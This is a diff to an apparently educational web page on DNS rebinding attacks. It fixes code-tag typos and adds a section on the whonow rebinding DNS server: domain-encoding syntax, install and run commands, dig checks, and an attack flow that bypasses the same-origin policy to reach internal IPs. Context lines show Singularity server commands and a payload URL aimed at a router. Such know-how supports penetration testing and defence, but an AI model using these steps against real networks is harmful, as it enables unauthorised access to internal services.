@@ -66,7 +66,7 @@ go build
 # Singularity then handles all DNS queries for *.rebind.attacker.com itself</code></pre>
 
   <h3>Running Singularity</h3>
-  <pre><code"># Start the server (runs DNS on :53 and HTTP on :80 and :8080):
+  <pre><code># Start the server (runs DNS on :53 and HTTP on :80 and :8080):
 sudo ./singularity-server -HTTPServerPort 8080 -DNSRebindStrategy "multiA" -ResponseIPAddr "127.0.0.1"
 
 # Key flags:
@@ -103,7 +103,7 @@ sudo ./singularity-server -HTTPServerPort 8080 -DNSRebindStrategy "multiA" -Resp
 # Available until May 18, 2026 via Chrome origin trial</code></pre>
 
   <h3>Built-in Attack Payloads</h3>
-  <pre><code"># Singularity ships payloads for common targets:
+  <pre><code># Singularity ships payloads for common targets:
 # Access via the Manager UI or direct URL
 
 # Grab home page of target service:
@@ -226,9 +226,57 @@ http://YOUR_SERVER:8080/singularity.html?targetHost=192.168.1.1&targetPort=80&at
 # - Firefox increased DNS cache TTL minimum
 # - CORS headers alone are NOT sufficient protection against DNS rebinding</code></pre>
 
+  <h2>whonow — Malicious DNS Server for DNS Rebinding</h2>
+  <p>whonow is a DNS server that implements DNS rebinding rules encoded directly in the subdomain of the requested domain. The rules specify which IP to return first, how many times, then which IP to rebind to — all without any server-side configuration. A public instance runs at <code>rebind.network</code> for testing.</p>
+  <pre><code># whonow encodes rebinding rules in the domain name itself:
+# Syntax: A.&lt;first-ip&gt;.&lt;N&gt;times.&lt;rebind-ip&gt;.forever.rebind.network
+#
+# A.1.2.3.4.1time.192.168.1.1.forever.rebind.network
+# │  │         │   │            │
+# │  └ first A record returned  └ final A record (forever)
+# │         └ return first IP this many times
+# └ record type (A)
+
+# This domain resolves as:
+# Request 1:      → 1.2.3.4        (attacker's server, 1 time)
+# Request 2+:     → 192.168.1.1    (internal IP, forever)
+
+# Multiple rounds — return attacker IP 3 times, then rebind:
+A.93.184.216.34.3times.127.0.0.1.forever.rebind.network
+
+# Use the public rebind.network server (no setup needed for testing):
+# Just use the domain directly as your DNS rebinding target
+# Browser visits: http://A.1.2.3.4.1time.127.0.0.1.forever.rebind.network/
+
+# Self-hosted — install whonow:
+npm install -g whonow
+# Run (requires port 53 — use sudo):
+sudo whonow
+
+# whonow reads the subdomain to determine response:
+# The server parses the subdomain tokens and applies them
+# No configuration file needed — all state is in the domain name
+
+# Attack flow with whonow:
+# 1. Buy/register a domain and set NS → your whonow server
+# 2. Or use rebind.network (public, for testing)
+# 3. Register a page at your attacker server that makes fetch() calls
+#    to http://A.YOUR_IP.1time.TARGET_IP.forever.yourdomain/
+# 4. Victim loads your page → browser resolves → YOUR_IP (first request)
+# 5. Page polls the same hostname → resolves → TARGET_IP (subsequent)
+# 6. SOP bypassed — JS reads from TARGET_IP via your controlled hostname
+
+# Test resolution using dig:
+dig A.1.2.3.4.1time.192.168.0.1.forever.rebind.network
+# First query returns: 1.2.3.4
+dig A.1.2.3.4.1time.192.168.0.1.forever.rebind.network
+# Second query returns: 192.168.0.1</code></pre>
+
   <h2>Resources</h2>
   <ul>
     <li>Singularity of Origin — <code>github.com/nccgroup/singularity</code></li>
+    <li>whonow — malicious DNS server — <code>github.com/brannondorsey/whonow</code></li>
+    <li>rebind.network — public whonow testing server — <code>rebind.network</code></li>
     <li>NCC Group DNS rebinding 2023 state — <code>nccgroup.com/us/research-blog/state-of-dns-rebinding-in-2023/</code></li>
     <li>Chrome Local Network Access spec — <code>wicg.github.io/local-network-access/</code></li>
     <li>PortSwigger research — DNS rebinding — <code>portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface</code></li>
